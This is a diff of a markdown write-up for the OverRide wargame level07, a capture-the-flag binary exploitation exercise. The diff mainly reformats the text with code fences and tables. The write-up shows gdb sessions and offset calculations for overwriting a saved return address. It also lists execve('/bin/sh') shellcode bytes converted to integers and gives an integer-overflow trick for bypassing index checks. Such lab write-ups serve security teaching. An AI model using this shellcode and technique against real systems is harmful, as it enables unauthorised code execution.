@@ -1,4 +1,3 @@
-***
 ```
    level07@OverRide:~$ ./level07
    ----------------------------------------------------
@@ -40,6 +39,7 @@
 ```
 ***
 
+```
    level07@OverRide:~$ gdb level07
    Non-debugging symbols:
    0x0804842c  _init
@@ -78,7 +78,7 @@
    0x08048a80  __do_global_ctors_aux
    0x08048aac  _fini
    (gdb)
-
+```
 ***
 
 With this information as well as analysis of assembler dump of functions we can say that:
@@ -94,7 +94,7 @@ So the initial plan is to store shellcode in the data array and overwrite eip to
 For this let's get eip and array addresses on stack:
 
 ***
-
+```
    (gdb) b main
    Breakpoint 1 at 0x8048729
    (gdb) r
@@ -108,7 +108,7 @@ For this let's get eip and array addresses on stack:
    Locals at 0xffffd708, Previous frame's sp is 0xffffd710
    Saved registers:
    ebp at 0xffffd708, eip at 0xffffd70c   # eip at 0xffffd70c -  address eip is saved at = main return address
-
+```
   ***
 ```
    # Let's find where array is located
@@ -135,7 +135,7 @@ For this let's get eip and array addresses on stack:
    0xffffd520:     0xffffd544    # 0xffffd544 - array address (altered by gdb with env variables); 0xffffd520 - its place on stack
 ```
 ***
-
+```
    (gdb) p 0xffffd70c - 0xffffd544     # offset in main of saved return address from the array
    $1 = 456
    (gdb) p 456 / 4                     # divide by step in the array (uint is 4 bytes)
@@ -143,7 +143,7 @@ For this let's get eip and array addresses on stack:
    
    (gdb) p 0xffffd544 - 0xffffd520     # offset between the array and its address pushed on stack 
    $4 = 36
-
+```
 ***
 
 Rip Index: 114 % 3 = 0 -> This index is forbidden but we know how to solve this
@@ -153,18 +153,19 @@ Runtime array address index: -36 / 4 = -9
 To put shellcode into the array we need to translate it into uints (each 4 bytes long):
 Shellcode for `execve("/bin/sh")` from [here](https://shell-storm.org/shellcode/files/shellcode-575.html): "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 
-hex      | \x6a\x0b\x58\x99  | \x52\x68\x2f\x2f  | \x73\x68\x68\x2f  | \x62\x69\x6e\x89  | \xe3\x31\xc9\xcd    | /x80
-4bytes   | 0x99580b6a        | 0x2f2f6852        | 0x2f686873        | 0x896e6962        | 0xcdc931e3          | 0x80
-uint     | 2572684138        | 791636050         | 795371635         | 2305714530        | 3452514787          | 128
+| hex      | \x6a\x0b\x58\x99  | \x52\x68\x2f\x2f  | \x73\x68\x68\x2f  | \x62\x69\x6e\x89  | \xe3\x31\xc9\xcd    | /x80  |
+| 4bytes   | 0x99580b6a        | 0x2f2f6852        | 0x2f686873        | 0x896e6962        | 0xcdc931e3          | 0x80 |
+| uint     | 2572684138        | 791636050         | 795371635         | 2305714530        | 3452514787          | 128  |
 
 To put shellcode at the beginning indeces of the array (0-5) we need to get around forbidden ones (0, 3).
 For this we use uint overflow:
 
-2**(32) overflows to 0: 
-(2**(32) / 4) % 3 = 1 
+2^(32) overflows to 0
 
-- Index 0: (2**(32)) / 4 = 1073741824
-- Index 3: (2**(32) + (3 * 4)) / 4 = 1073741827
+(2^(32) / 4) % 3 = 1 
+
+- Index 0: (2^(32)) / 4 = 1073741824
+- Index 3: (2^(32) + (3 * 4)) / 4 = 1073741827
  
 To store runtime array address at eip we also has to use this trick:
 
